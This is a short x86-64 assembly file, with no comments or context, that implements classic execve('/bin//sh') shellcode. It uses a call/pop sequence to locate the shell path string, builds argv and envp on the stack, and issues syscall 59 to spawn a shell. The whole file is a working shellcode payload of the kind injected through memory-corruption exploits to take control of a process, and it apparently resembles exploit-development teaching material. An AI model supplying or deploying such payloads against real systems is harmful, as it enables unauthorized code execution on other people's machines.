.section data

.section .text
.global _start
_start:
call begin
.ascii "/bin//sh\0"


begin:
pop %rdi

xor %rax, %rax

push %rax
mov %rsp, %rdx
push %rdi
mov %rsp, %rsi

end:
movb $59, %al
syscall





